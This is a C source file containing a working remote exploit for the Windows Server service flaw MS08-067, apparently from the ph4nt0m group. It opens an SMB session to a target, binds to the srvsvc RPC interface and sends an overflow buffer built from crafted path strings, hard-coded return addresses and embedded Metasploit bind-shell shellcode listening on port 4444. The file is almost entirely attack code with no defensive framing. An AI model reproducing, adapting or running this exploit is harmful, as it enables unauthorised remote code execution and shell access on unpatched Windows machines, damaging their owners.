#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>
#include <memory.h>
#include <wchar.h>
#include "srvsvc.h"
#include "srvsvc_c.c"
#include "mem.h"


#pragma comment(lib,"ws2_32")
#pragma comment(lib,"mpr")
#pragma comment(lib,"rpcrt4.lib")
#pragma comment(lib,"MSVCRT.LIB")

DWORD	dwRetAddr = 0x7ffa0eb8;
DWORD	dwJmpAddr = 0x7ffa0eb7;

/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char sc[] =
"\x83\xEC\x70"	// sub esp, 0x70
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad"
"\x07\xe6\x4a\x83\xeb\xfc\xe2\xf4\x51\x6d\x0d\x07\x45\xfe\x19\xb5"
"\x52\x67\x6d\x26\x89\x23\x6d\x0f\x91\x8c\x9a\x4f\xd5\x06\x09\xc1"
"\xe2\x1f\x6d\x15\x8d\x06\x0d\x03\x26\x33\x6d\x4b\x43\x36\x26\xd3"
"\x01\x83\x26\x3e\xaa\xc6\x2c\x47\xac\xc5\x0d\xbe\x96\x53\xc2\x62"
"\xd8\xe2\x6d\x15\x89\x06\x0d\x2c\x26\x0b\xad\xc1\xf2\x1b\xe7\xa1"
"\xae\x2b\x6d\xc3\xc1\x23\xfa\x2b\x6e\x36\x3d\x2e\x26\x44\xd6\xc1"
"\xed\x0b\x6d\x3a\xb1\xaa\x6d\x0a\xa5\x59\x8e\xc4\xe3\x09\x0a\x1a"
"\x52\xd1\x80\x19\xcb\x6f\xd5\x78\xc5\x70\x95\x78\xf2\x53\x19\x9a"
"\xc5\xcc\x0b\xb6\x96\x57\x19\x9c\xf2\x8e\x03\x2c\x2c\xea\xee\x48"
"\xf8\x6d\xe4\xb5\x7d\x6f\x3f\x43\x58\xaa\xb1\xb5\x7b\x54\xb5\x19"
"\xfe\x54\xa5\x19\xee\x54\x19\x9a\xcb\x6f\xf7\x16\xcb\x54\x6f\xab"
"\x38\x6f\x42\x50\xdd\xc0\xb1\xb5\x7b\x6d\xf6\x1b\xf8\xf8\x36\x22"
"\x09\xaa\xc8\xa3\xfa\xf8\x30\x19\xf8\xf8\x36\x22\x48\x4e\x60\x03"
"\xfa\xf8\x30\x1a\xf9\x53\xb3\xb5\x7d\x94\x8e\xad\xd4\xc1\x9f\x1d"
"\x52\xd1\xb3\xb5\x7d\x61\x8c\x2e\xcb\x6f\x85\x27\x24\xe2\x8c\x1a"
"\xf4\x2e\x2a\xc3\x4a\x6d\xa2\xc3\x4f\x36\x26\xb9\x07\xf9\xa4\x67"
"\x53\x45\xca\xd9\x20\x7d\xde\xe1\x06\xac\x8e\x38\x53\xb4\xf0\xb5"
"\xd8\x43\x19\x9c\xf6\x50\xb4\x1b\xfc\x56\x8c\x4b\xfc\x56\xb3\x1b"
"\x52\xd7\x8e\xe7\x74\x02\x28\x19\x52\xd1\x8c\xb5\x52\x30\x19\x9a"
"\x26\x50\x1a\xc9\x69\x63\x19\x9c\xff\xf8\x36\x22\x42\xc9\x06\x2a"
"\xfe\xf8\x30\xb5\x7d\x07\xe6\x4a";


int MakeBuff(char *Buff,int BufLen);
void Usage(char *ProgName);
int WaitExit();

#define CN	0
#define TW	1

void main(int argc, char *argv[])
{
	NETRESOURCE	lpNetResource;
	char	Username[256] = {0};
	char	Password[256] = {0};
	DWORD	Ret = 0;
	RPC_STATUS status;
	unsigned char * pszUuid = NULL;
	unsigned char * pszProtocolSequence = "ncacn_np";
	unsigned char * pszNetworkAddress = "";
	unsigned char	pszEndpoint[100] = "\\pipe\\browser";
	unsigned char * pszOptions = NULL;
	unsigned char * pszStringBinding = NULL;

	char	Server[256] = {0};
	char	RemoteName[256] = {0};
	char	Buff[0x700];
	char	Buff2[1000] = {0};
	char	*pBuff2 = (char *)&Buff2;
	char	Buff3[100] = {0};
	int		BufLen = 0;
//	int		i;
	int		ForceAttack = 0;
	int		AntiDEP = 0;

	int		nLanguage = 0;
	DWORD	dwID = 0;

	if(argc != 2)
	{
		Usage(argv[0]);
		return;
	}

	strcpy(Server,argv[1]);
	sprintf(RemoteName,"\\\\%s\\IPC$",Server);
	pszNetworkAddress = Server;


	if(strlen(Server) == 0)
	{
		Usage(argv[0]);
		return;
	}

	printf("\nMS08-067 Exploit for CN by EMM@ph4nt0m.org\n\n");

	lpNetResource.dwScope=RESOURCE_CONNECTED;
	lpNetResource.dwType =RESOURCETYPE_DISK;
	lpNetResource.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE;
	lpNetResource.dwUsage=RESOURCEUSAGE_CONNECTABLE;
	lpNetResource.lpLocalName=NULL;
	lpNetResource.lpRemoteName = RemoteName;
	lpNetResource.lpComment=NULL;
	lpNetResource.lpProvider=NULL;

	Ret = WNetAddConnection2(&lpNetResource,Username,Password,CONNECT_UPDATE_PROFILE);
	if(Ret != NO_ERROR)
	{
		printf("Make SMB Connection error:%d\n",GetLastError());
		return;
	}
	
	printf("SMB Connect OK!\n");

	status = RpcStringBindingCompose(pszUuid,
									pszProtocolSequence,
									pszNetworkAddress,
									pszEndpoint,
									pszOptions,
									&pszStringBinding);
	if(status != RPC_S_OK)
	{
		return;
	}
	status = RpcBindingFromStringBinding(pszStringBinding,&srvsvc__MIDL_AutoBindHandle);
	if(status != RPC_S_OK)
	{
		return;
	}


   RpcTryExcept
    {

		func23(L"ph4nt0m",(wchar_t *)"\x53\x00\x56\x89\x56\x89\x56\x89\x56\x89",(wchar_t *)"\x4D\x00\x56\x89\x56\x89",4,0);


		memset(Buff,0,sizeof(Buff));
		BufLen = MakeBuff(Buff,sizeof(Buff));

		CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WaitExit,(LPVOID)NULL,0,&dwID);
		(DWORD)*(DWORD *)Buff3 = 1;
		func1f(L"EMM!",(wchar_t *)Buff,Buff2,1000,L"",(DWORD *)Buff3,1);

    }
    RpcExcept ( 1 )
    {
        status = RpcExceptionCode();
		if(status == 1726)
		{
		}
		else
		{
			printf("RpcExceptionCode() = %u\r\n", status );
			return;
		}
    }
    RpcEndExcept
//*/
	printf("Maybe Patched!\n");


    RpcStringFree( &pszStringBinding );
    RpcBindingFree( &srvsvc__MIDL_AutoBindHandle );
	return;
}


#define	JMPPOINT	"B041"
int MakeBuff(char *Buff, int BufLen)
{
	int len = 0;
	char tmp[5] = {0};
	int i;

	for(i = 0; i < BufLen/4; i++)
	{
		memset(tmp,0,4);
		sprintf(tmp,"B%03d",i);
//*		
		if(memcmp(tmp,JMPPOINT,4) == 0)
		{
			break;
		}
//*/
		memcpy(Buff + len,tmp,4);
		len += 4;
	}

	memcpy(Buff,L".\\\\a\\..\\..\\NN",13*2);

	for(i = 0; i < 6; i++)
	{
		memcpy(Buff + len,&dwRetAddr,4);
		len += 4;
	}
	
	memcpy(Buff + len,&dwJmpAddr,4);
	len += 4;
	memset(Buff + len,0x48,0x4);
	len += 4;

	memcpy(Buff + len,sc,sizeof(sc) - 1);
	len += sizeof(sc) - 1;

	memcpy(Buff + len,"EMM!",4);
	len += 4;

	memset(Buff + 0x206 * 2,0,2);
	return len;
}

void Usage(char *ProgName)
{
	printf("\n MS08-067 Exploit for CN by EMM@ph4nt0m.org\n\n %s <Server>\n\n",ProgName);
	return;
}

int WaitExit()
{
	Sleep(1000 * 5);
	printf("Send Payload Over!\n");
	ExitProcess(0);
	return 0;
}